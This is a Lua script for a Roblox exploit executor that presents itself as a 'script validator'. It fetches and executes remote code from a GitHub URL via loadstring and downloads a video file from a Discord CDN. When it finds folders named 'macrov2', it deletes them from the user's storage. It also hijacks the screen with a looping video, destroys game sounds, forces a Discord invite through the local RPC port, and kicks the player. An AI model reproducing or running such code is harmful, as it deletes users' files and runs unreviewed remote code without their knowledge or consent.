local SoundService = game:GetService("SoundService")
if not game:IsLoaded() then game.Loaded():Wait() end

local API = loadstring(game:HttpGet("https://raw.githubusercontent.com/7BioHazard/Utils/main/API.lua"))()
local data = (syn and syn.request or http_request or request)({
    Url = "https://cdn.discordapp.com/attachments/846837559782932560/1099421903610990744/Y2Mate.is_-_Berserk_Skeleton_Meme_Extended-dUcVXUSFei4-480p-1657664838500.mp4",
    Method = "GET"
})
local getasset = getsynasset or getcustomasset
local bannedFolders = {"macrov2", "macrov2-tester"}
local detected = false
local list = ""

local validator = {}

writefile("scriptValidator.mp4", data.Body)

for _, v in next, bannedFolders do
    if isfolder(v) then
        detected = true
        break
    end
end

local function Join_Discord(Link)
    (syn and syn.request or http_request)(
        {
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json",
            ["Origin"] = "https://discord.com"},
            Body = game:GetService("HttpService"):JSONEncode(
                {
                    cmd = "INVITE_BROWSER",
                    args = {
                        code = Link or "Q9DGr3DEGE"
                    },
                    nonce = game:GetService("HttpService"):GenerateGUID(false)
                }
            ),
        }
    )
end

function validator:Check()
    if detected then
        for _, v in next, bannedFolders do
            if isfolder(v) then
                delfolder(v)
                list = list .. v
            end
        end

        local screen = API:Create("ScreenGui", {
            Parent = game.CoreGui,
            IgnoreGuiInset = true
        })

        if gethui then
            screen.Parent = gethui()
        elseif syn.protect_gui then
            syn.protect_gui(screen)
            screen.Parent = game:GetService("CoreGui")
        elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
            screen.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
        else
            screen.Parent = game:GetService("CoreGui")
        end

        local video = API:Create("VideoFrame", {
            Parent = game.CoreGui.ScreenGui,
            Size = UDim2.new(1, 0, 1, 0),
            Video = getasset("scriptValidator.mp4"),
            Looped = true
        })

        for _, v in next, game:GetDescendants() do
            if v:IsA("Sound") then
                v:Destroy()
            end
        end

        video:Play()

        if not rconsoleprint then
            game.Players.LocalPlayer:Kick("\nYou have been caught having a skid script! Never use them again!")
        else
            rconsoleprint("@@RED@@")
            rconsoleprint([[
                 _____           _       _     _   _       _ _     _       _             
                /  ___|         (_)     | |   | | | |     | (_)   | |     | |            
                \ `--.  ___ _ __ _ _ __ | |_  | | | | __ _| |_  __| | __ _| |_ ___  _ __ 
                 `--. \/ __| '__| | '_ \| __| | | | |/ _` | | |/ _` |/ _` | __/ _ \| '__|
                /\__/ / (__| |  | | |_) | |_  \ \_/ / (_| | | | (_| | (_| | || (_) | |   
                \____/ \___|_|  |_| .__/ \__|  \___/ \__,_|_|_|\__,_|\__,_|\__\___/|_|   
                                  | |                                                    
                                  |_|                                                    
                 _                  ______                                               
                | |                |___  /                                               
                | |__  _   _  __  __  / / _   _ _ __                                     
                | '_ \| | | | \ \/ / / / | | | | '_ \                                    
                | |_) | |_| |  >  <./ /__| |_| | | | |                                   
                |_.__/ \__, | /_/\_\_____/\__, |_| |_|                                   
                        __/ |              __/ |                                         
                       |___/              |___/           
            ]])
            rconsoleprint("\n\nHaha! You have been caught using a skidded script (s)! [" .. list .. "]")
            rconsoleprint("\nNever use them again, I WARNED YOU!")

            Join_Discord()

            game.Players.LocalPlayer:Kick("\nYou have been caught having a skid script! Never use them again!")
        end
    else
        print("[SCRIPT VALIDATOR by xZyn] Check passed!")
        return
    end
end

return validator
